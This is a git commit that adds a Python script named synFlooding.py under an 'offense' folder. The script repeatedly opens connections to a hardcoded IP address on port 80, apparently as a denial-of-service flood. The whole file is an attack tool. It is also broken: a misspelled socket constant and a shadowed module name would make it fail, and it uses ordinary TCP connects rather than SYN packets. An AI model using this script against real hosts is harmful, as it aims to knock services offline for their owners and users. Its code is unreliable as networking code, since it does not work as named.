8ca4e952f0e2f5c0ee7ca298ebba9fec9f34e947
user <aa098933967901@gmail.com>
2023-09-06 18:46:46 +0800

    add synFlooding.py

---
+++ offense/synFlooding.py
@@ -0,0 +1,29 @@
+import socket
+import random
+
+def synPacket(sourcePorts,target):
+    sourcePort = random.choice(sourcePorts)
+    print(sourcePort)
+    socket = socket.socket(socket.AF_INET,socket.SOCK_STRAM)
+    socket.settimeout(4)
+    socket.connect(target)
+
+def synFlooding(targetIP,targetPort):
+    try:
+        target = (targetIP,targetPort)
+        sourcePorts = range(1024,65535)
+        print(sourcePorts)
+
+        while 1:
+            synPacket(sourcePorts,target)
+
+    except KeyboardInterrupt:
+        print("Attack stopped.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+if __name__ == '__main__':
+
+    targetIP = "12.0.0.4"
+    targetPort = 80
+
+    synFlooding(targetIP,targetPort)
